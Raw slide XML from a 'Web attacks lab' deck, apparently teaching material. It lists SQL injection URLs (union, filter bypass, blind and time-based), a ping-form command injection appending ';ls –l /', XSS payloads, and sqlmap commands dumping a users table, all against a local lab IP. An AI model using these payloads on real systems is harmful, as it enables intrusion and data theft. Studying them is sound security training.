                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>6-SQL: Adding filter that replace select with space and try </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="399960">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="439"/>
              </a:spcBef>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike" u="sng">
                <a:solidFill>
                  <a:srgbClr val="00a3d6"/>
                </a:solidFill>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>http://192.168.67.128/compiler/sql/id1.php?id=1+union+select+*+from+users</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="399960">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="439"/>
              </a:spcBef>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike" u="sng">
                <a:solidFill>
                  <a:srgbClr val="00a3d6"/>
                </a:solidFill>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike" u="sng">
                <a:solidFill>
                  <a:srgbClr val="00a3d6"/>
                </a:solidFill>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>http://192.168.67.128/compiler/sql/id1.php?id=1+union+selselectect+*+from+users</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="399960">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="439"/>
              </a:spcBef>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike" u="sng">
                <a:solidFill>
                  <a:srgbClr val="00a3d6"/>
                </a:solidFill>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
                <a:hlinkClick r:id="rId6"/>
              </a:rPr>
              <a:t>	http://192.168.67.128/compiler/sql/id1.php?id=1+union+Select+*+from+users</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>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attacks lab</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1088" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="830556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8-Blind SQL:</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="399960">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="439"/>
              </a:spcBef>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>http://192.168.67.128/compiler/sql/sql2.php?id=1</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="399960">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="439"/>
              </a:spcBef>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>http://192.168.67.128/compiler/sql/sql2.php?id=1+and+1=if(substring(database(),2,1)='t',1,0)</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>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tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>9-Timed SQL:</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="399960">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="439"/>
              </a:spcBef>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike" u="sng">
                <a:solidFill>
                  <a:srgbClr val="00a3d6"/>
                </a:solidFill>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
                <a:hlinkClick r:id="rId1"/>
              </a:rPr>
              <a:t>http://192.168.67.128/compiler/sql/sql3.php?id=1</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="399960">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="439"/>
              </a:spcBef>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>http://192.168.67.128/compiler/sql/id.php?id=1+and+1=if(substring(database(),2,1)='t',sleep(10),0)</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>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9"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attacks lab</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1090" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="830556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11-Remote execution:</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="399960">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="439"/>
              </a:spcBef>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike" u="sng">
                <a:solidFill>
                  <a:srgbClr val="00a3d6"/>
                </a:solidFill>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
                <a:hlinkClick r:id="rId1"/>
              </a:rPr>
              <a:t>http://192.168.67.128/compiler/rexec/index.php</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> : Enter hostname to ping</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="399960">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="439"/>
              </a:spcBef>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike" u="sng">
                <a:solidFill>
                  <a:srgbClr val="00a3d6"/>
                </a:solidFill>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://192.168.67.128/compiler/rexec/index.php</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>: Enter hostname to ping postfixed with ;ls –l /</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="343080" indent="-343080">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>12-Cross-site scripting.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="800280">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike" u="sng">
                <a:solidFill>
                  <a:srgbClr val="00a3d6"/>
                </a:solidFill>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>http://192.168.67.128/compiler/xss/example1.php?name=ahmed</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="800280">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike" u="sng">
                <a:solidFill>
                  <a:srgbClr val="00a3d6"/>
                </a:solidFill>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>http://192.168.67.128/compiler/xss/example1.php?name=&lt;script&gt;alert(1);&lt;/script</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="800280">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike" u="sng">
                <a:solidFill>
                  <a:srgbClr val="00a3d6"/>
                </a:solidFill>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>http://192.168.67.128/compiler/xss/example2.php?name=&lt;script&gt;alert(1);&lt;/script</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="800280">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>http://192.168.67.128/compiler/xss/example2.php?name=ahmed+&lt;img src="asd" onerror=alert(1)&gt;</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="20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1"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attacks lab</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1092" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="830556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1-burpsuite_free_v1.5</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2-SQL MAP </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3-Nikto</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4-Nessus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5-GoogleDorks</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6-WebCrowler (HTTPTrack, Wget)</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>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7-WebScarab (HTTP traffic interception)</a:t>
            </a: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title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="457200"/>
            <a:ext cx="7772040" cy="990360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr numCol="1" spcCol="0" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="bc4b2c"/>
                </a:solidFill>
                <a:latin typeface="Georgia"/>
              </a:rPr>
              <a:t>Web attacks lab</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1094" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="8305560" cy="4952520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr numCol="1" spcCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr marL="343080" indent="-343080">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Examples with SQL MAP: - Need python 1.7 –</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="24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pl-PL" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="pl-PL" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>python sqlmap.py -u  </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="pl-PL" sz="2200" spc="-1" strike="noStrike" u="sng">
                <a:solidFill>
                  <a:srgbClr val="00a3d6"/>
                </a:solidFill>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
                <a:hlinkClick r:id="rId1"/>
              </a:rPr>
              <a:t>http://192.168.67.128/compiler/sql/id.php?id=1</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pl-PL" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="pl-PL" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>python sqlmap.py -u  </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="pl-PL" sz="2200" spc="-1" strike="noStrike" u="sng">
                <a:solidFill>
                  <a:srgbClr val="00a3d6"/>
                </a:solidFill>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://192.168.67.128/compiler/sql/id.php?id=1</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> –dbs</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pl-PL" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="pl-PL" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>python sqlmap.py -u  </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="pl-PL" sz="2200" spc="-1" strike="noStrike" u="sng">
                <a:solidFill>
                  <a:srgbClr val="00a3d6"/>
                </a:solidFill>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>http://192.168.67.128/compiler/sql/id.php?id=1</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> –tables –D itidb</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285840">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="439"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="pl-PL" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="pl-PL" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>python sqlmap.py -u  </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="pl-PL" sz="2200" spc="-1" strike="noStrike" u="sng">
                <a:solidFill>
                  <a:srgbClr val="00a3d6"/>
                </a:solidFill>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>http://192.168.67.128/compiler/sql/id.php?id=1</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> –dump –D itidb –T users</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="22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a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>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4742</TotalTime>
  <Application>LibreOffice/7.3.7.2$Linux_X86_64 LibreOffice_project/30$Build-2</Application>
  <AppVersion>15.0000</AppVersion>
  <Words>5212</Words>
  <Paragraphs>959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1601-01-01T00:00:00Z</dcterms:created>
  <dc:creator>Islam</dc:creator>
  <dc:description/>
  <dc:language>en-US</dc:language>
  <cp:lastModifiedBy/>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-03-16T12:09:22Z</dcterms:modified>
  <cp:revision>600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45</vt:i4>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i4>152</vt:i4>
  </property>
</Properties>
</file>